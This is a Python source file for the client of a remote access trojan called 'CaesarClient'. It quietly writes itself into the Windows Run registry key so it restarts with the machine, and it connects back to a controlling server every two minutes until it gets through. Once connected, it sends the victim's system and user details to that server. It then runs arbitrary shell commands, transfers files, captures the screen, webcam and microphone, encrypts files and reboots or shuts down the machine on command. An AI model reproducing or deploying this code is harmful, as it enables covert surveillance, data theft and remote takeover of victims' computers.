import os
import sys
import time
import json
import winreg
import socket
import getpass
import datetime
import platform
import subprocess
from getmac import get_mac_address as gma
from general_features import GeneralFeatures



class CaesarClient:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.generalFeatures = GeneralFeatures()


    def add_to_startup(self, script_path):
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_ALL_ACCESS,
            )

            winreg.SetValueEx(key, "Caesar", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
        except Exception as e:
            pass
            #print(e)


    # returns client system information to the server
    def get_platform_info(self, conn):
        sys_info = {
            "mac-address": gma(),
            "os": platform.uname().system,
            "node-name": platform.uname().node,
            "release": platform.uname().release,
            "version": platform.uname().version,
            "machine": platform.uname().machine,
            "date-joined": str(datetime.date.today()),
            "time-joined": str(datetime.datetime.now().time()),
            "user": getpass.getuser()
            }

        system_info_string = json.dumps(sys_info)
        conn.send(system_info_string.encode())


    #tries to connect back to the server
    def establish_connection(self):
        self.add_to_startup(os.path.abspath(sys.argv[0]))

        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                break
            except socket.error as err:
                time.sleep(120) #try to reconnect after 2 minutes

        # send system info back to server
        self.get_platform_info(self.sock)

        # check command sent from the server
        while True:
            cmd = self.sock.recv(65536).decode()
            if cmd == " ":
                self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode()) #send current working directory back to server

            elif cmd[:2] == 'cd':
                #change directory
                try:
                    os.chdir(cmd[3:])
                    result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    result = result.stdout.read() + result.stderr.read()
                    result = result.decode()

                    if "The system cannot find the path specified." in result:
                        self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())
                    else:
                        self.sock.send(f"{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())

                except(FileNotFoundError, IOError):
                    self.sock.send(f"[-]Directory does not exist!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())

            elif "get" in cmd:
                self.generalFeatures.send_client_file(self.sock, cmd[4:])

            elif "send" in cmd:
                usrFile = os.path.basename(cmd[5:])
                self.generalFeatures.receive_server_file(self.sock, usrFile)
            elif cmd == "screenshot":
                self.generalFeatures.screenshot(self.sock)
            elif cmd == "screenfeed":
                self.generalFeatures.live_screen_feed(self.sock)
            elif cmd == "camshot":
                self.generalFeatures.webcam_capture(self.sock)
            elif cmd == "camfeed":
                self.generalFeatures.capture_webcam_video(self.sock)
            elif cmd == "audiofeed":
                self.generalFeatures.live_audio_feed(self.sock)
            elif cmd == "reboot":
                self.generalFeatures.reboot(self.sock)
            elif cmd == "shutdown":
                self.generalFeatures.shutdown(self.sock)

            elif "encrypt" in cmd:
                cmd = cmd.split(" ", 2)

                if len(cmd) == 3:
                    self.generalFeatures.encrypt_file(self.sock, "".join(cmd[1]), "".join(cmd[2]))
                elif len(cmd) > 3 or len(cmd) < 3:
                    self.sock.send(f"[-]Invalid command!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())

            elif "decrypt" in cmd:
                cmd = cmd.split(" ", 2)
                if len(cmd) == 3:
                    self.generalFeatures.decrypt_file(self.sock, "".join(cmd[1]), "".join(cmd[2]))
                elif len(cmd) > 3 or len(cmd) < 3:
                    self.sock.send(f"[-]Invalid command!!! \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:".encode())

            elif cmd == "conn check":
                pass

            else:
                try:
                    #return terminal output back to server
                    terminal_output = subprocess.Popen(cmd, shell=True,
                                                       stdout=subprocess.PIPE,
                                                       stderr=subprocess.PIPE,
                                                       stdin=subprocess.PIPE)

                    terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
                    terminal_output = terminal_output.decode()
                    output = f"{str(terminal_output)} \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:"
                    self.sock.send(output.encode())

                except Exception as e:
                    output = f"{str(e)} \n{self.generalFeatures.convert_caesar_text('Caesar')} {str(os.getcwd())}:"
                    self.sock.send(output.encode())
